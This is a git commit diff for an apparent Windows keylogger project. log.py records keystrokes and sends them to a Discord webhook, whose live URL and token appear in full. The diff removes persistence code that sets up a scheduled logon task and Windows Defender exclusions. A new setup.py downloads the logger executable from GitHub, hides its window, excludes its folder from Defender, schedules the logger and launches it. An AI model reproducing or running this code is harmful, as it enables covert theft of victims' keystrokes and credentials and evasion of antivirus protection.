85cd52fee73eac32223d1c2e0e040f6ed97b0858
Pixel48 <piksel48@gmail.com>
2024-06-18 01:29:10 +0200

    Rework

--- log.py
+++ log.py
@@ -1,17 +1,12 @@
 import os
-from subprocess import CalledProcessError, run
 from pythoncom import PumpMessages
 from keyboard import on_release
-from win32gui import ShowWindow, FindWindow
-from sys import executable
 from threading import Timer
-from shutil import copy
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
-from time import sleep
 
-INTERVAL = 30
-WEBHOOK = "https://discord.com/api/webhooks/1252348767076745330/dudagpcaTIvzXpkOVoc4dfDlZY63A9VQugMBHOyF3TBHZm7_Ffz9k1c261BlvWV-qPKp"
+INTERVAL = 5
+WEBHOOK = "https://discord.com/api/webhooks/1252318266714619936/QOs16L3ro2s9rMbb27HKlAPlUqZg91g2uCMbkqpSDl9tW1_NLrtQegKXPjTIDq8AAOpY"
 
 class Klasa:
     def __init__(self, interval):
@@ -56,30 +51,10 @@ class Klasa:
         on_release(callback=self.build_script)
         self.run()
 
-
-
-def preserve():
-    this_filepath = os.path.abspath(executable)
-    this_filename = os.path.basename(this_filepath)
-    this_folder = os.path.dirname(this_filepath)
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
-    os.makedirs(startup_folder, exist_ok=True)
-    startup_filepath = os.path.join(startup_folder, this_filename)
-    if(not os.path.exists(startup_filepath) and startup_folder not in this_filepath):
-        copy(this_filepath, startup_filepath)
-        run(['schtasks', '/create', '/f', '/tn', 'Log', '/tr', f"\"{startup_filepath}\"", '/sc', 'onlogon', '/rl', 'highest', '/delay', '0000:10'])
-
-        ps_command_startup = f"Add-MpPreference -ExclusionPath '{startup_folder}'"
-        ps_command_org = f"Add-MpPreference -ExclusionPath '{this_folder}'"
-        try:
-            run(["powershell", "-Command", ps_command_startup], check=True)
-            run(["powershell", "-Command", ps_command_org], check=True)
-        except CalledProcessError as e:
-            print(f"Błąd dodawania do wyjątków Windows Defender: {e}")
-
-if __name__ == '__main__':
-    ShowWindow(FindWindow(None, os.path.abspath(executable)), 0)
-    preserve()
+def main():
     klasa = Klasa(INTERVAL)
     klasa.start()
     PumpMessages()
+
+if __name__ == '__main__':
+    main()
---
+++ setup.py
@@ -0,0 +1,35 @@
+import os
+from win32gui import ShowWindow, GetForegroundWindow
+from requests import get
+from subprocess import run
+
+url = 'https://github.com/pixel48/Logger/raw/exec/'
+
+folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
+filepath = os.path.join(folderpath, 'log.exe')
+
+def download(url, path):
+    with open(path, 'wb') as file:
+        response = get(url)
+        file.write(response.content)
+
+def hide_window():
+    window = GetForegroundWindow()
+    ShowWindow(window, 0)
+
+def setup_task():
+    run(['schtasks', '/run', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])
+
+def setup_defender():
+    command = f'Add-MpPreference -ExclusionPath "{folderpath}"'
+    run(['powershell', 'Add-MpPreference', '-ExclusionPath', command], check=True)
+
+def main():
+    hide_window()
+    setup_defender()
+    download(url, filepath)
+    setup_task()
+    os.startfile(filepath)
+
+if __name__ == '__main__':
+    main()
